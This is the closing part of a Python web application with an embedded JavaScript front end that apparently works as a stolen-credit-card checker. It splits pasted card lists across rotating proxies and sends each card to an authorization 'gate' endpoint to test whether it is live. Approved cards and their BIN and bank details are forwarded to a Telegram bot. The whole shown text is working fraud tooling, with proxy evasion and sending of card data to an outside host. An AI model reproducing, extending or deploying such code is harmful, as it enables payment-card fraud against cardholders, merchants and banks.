        document.getElementById("pauseButton").textContent = "Pause";
    }

    async function checkAndPruneProxies() {
        const deadBox = document.getElementById("deadBox");
        const proxyTa = document.getElementById("proxyInput");
        const deadProxyTa = document.getElementById("deadProxyInput");
        const maxThreads = parseInt(document.getElementById("proxyThreads").value) || 50;
        const lines = proxyTa.value.split(/[\\n,]/).map(l => l.trim()).filter(Boolean);
        if (!lines.length) return alert("Paste proxies first.");

        deadBox.innerHTML = `Pruning ${lines.length} proxies...`;
        let liveProxies = [];
        let deadProxies = [];
        let idx = 0;

        async function worker() {
            while (idx < lines.length) {
                const current = lines[idx++];
                try {
                    const res = await fetch("/api/proxy/test?proxy=" + encodeURIComponent(current));
                    const d = await res.json();
                    if (d.status === "LIVE") {
                        liveProxies.push(current);
                    } else {
                        deadProxies.push(current);
                    }
                } catch (e) {
                    deadProxies.push(current);
                }
            }
        }
        await Promise.all(Array.from({ length: Math.min(maxThreads, lines.length) }, () => worker()));
        proxyTa.value = liveProxies.join("\\n");
        deadProxyTa.value = deadProxies.join("\\n");
        deadBox.innerHTML = `<div class="text-emerald-400 font-bold">Proxy Prune Done: ${liveProxies.length} Live, ${deadProxies.length} Dead (Auto-dropped).</div>`;
    }

    async function sendTelegram(token, chatId, text) {
        if (!token || !chatId) return;
        try {
            await fetch(`/api/telegram/send?token=${encodeURIComponent(token)}&chat_id=${encodeURIComponent(chatId)}&message=${encodeURIComponent(text)}`);
        } catch (e) {}
    }

    async function runBatchChecker() {
        const btn = document.getElementById("checkButton");
        const pauseBtn = document.getElementById("pauseButton");
        const stopBtn = document.getElementById("stopButton");
        const liveBox = document.getElementById("liveBox");
        const deadBox = document.getElementById("deadBox");
        const bar = document.getElementById("progressBar");
        const target = document.getElementById("targetSelect").value;
        const maxThreads = parseInt(document.getElementById("cardThreads").value) || 3;

        const tgToken = document.getElementById("tgToken").value.trim();
        const tgChatId = document.getElementById("tgChatId").value.trim();

        const cards = document.getElementById("cardInput").value.split("\\n").map(l => l.trim()).filter(Boolean);
        const proxies = document.getElementById("proxyInput").value.split(/[\\n,]/).map(l => l.trim()).filter(Boolean);
        if (!cards.length) return alert("Paste cards first.");

        btn.disabled = true;
        pauseBtn.disabled = false;
        stopBtn.disabled = false;
        isStopped = false;
        isPaused = false;

        let live = 0, dead = 0, checked = 0;
        document.getElementById("liveCount").textContent = "0";
        document.getElementById("deadCount").textContent = "0";
        document.getElementById("checkedCount").textContent = "0";
        liveBox.innerHTML = "";
        deadBox.innerHTML = "";
        bar.style.width = "0%";

        const pairs = cards.map((c, i) => ({
            card: c,
            proxy: proxies.length ? proxies[i % proxies.length] : ""
        }));

        let idx = 0;
        const total = pairs.length;

        async function cardWorker() {
            while (idx < total && !isStopped) {
                while (isPaused && !isStopped) {
                    await new Promise(r => setTimeout(r, 500));
                }
                if (isStopped) break;

                const pair = pairs[idx++];
                try {
                    let url = `/api/auth/check?card=${encodeURIComponent(pair.card)}&target=${encodeURIComponent(target)}`;
                    if (pair.proxy) url += `&proxy=${encodeURIComponent(pair.proxy)}`;
                    const resp = await fetch(url);
                    const d = await resp.json();

                    checked++;
                    document.getElementById("checkedCount").textContent = String(checked);
                    bar.style.width = Math.round((checked / total) * 100) + "%";

                    const bank = d.bin_info?.bank ? `${d.bin_info.bank} (${d.bin_info.country})` : "BIN";
                    const gate = d.target_used ? ` [${d.target_used}]` : "";
                    const line = `[${d.status}] ${pair.card} -> ${d.reason}${gate} | ${bank} (${d.latency_ms}ms)`;

                    const row = document.createElement("div");
                    row.textContent = line;

                    if (d.status === "LIVE") {
                        live++;
                        document.getElementById("liveCount").textContent = String(live);
                        liveBox.appendChild(row);
                        liveBox.scrollTop = liveBox.scrollHeight;
                        playTone('live');
                        if (tgToken && tgChatId) {
                            sendTelegram(tgToken, tgChatId, `🔥 REAL AUTH APPROVED (LIVE) 🔥\\n${line}`);
                        }
                    } else {
                        dead++;
                        document.getElementById("deadCount").textContent = String(dead);
                        deadBox.appendChild(row);
                        deadBox.scrollTop = deadBox.scrollHeight;
                        playTone('dead');
                    }
                } catch (err) {
                    checked++;
                    dead++;
                    document.getElementById("checkedCount").textContent = String(checked);
                    document.getElementById("deadCount").textContent = String(dead);
                    const row = document.createElement("div");
                    row.textContent = `[ERROR] ${pair.card} -> ${err.message}`;
                    deadBox.appendChild(row);
                    deadBox.scrollTop = deadBox.scrollHeight;
                }
            }
        }

        const workers = Math.min(maxThreads, total);
        btn.textContent = `Running Real Auth (${workers} threads)...`;
        await Promise.all(Array.from({ length: workers }, () => cardWorker()));

        stopChecker();
        bar.style.width = "100%";
    }
    </script>
</body>
</html>"""


if __name__ == "__main__":
    import uvicorn
    uvicorn.run("app:app", host="0.0.0.0", port=int(os.getenv("PORT", 8000)), reload=False)
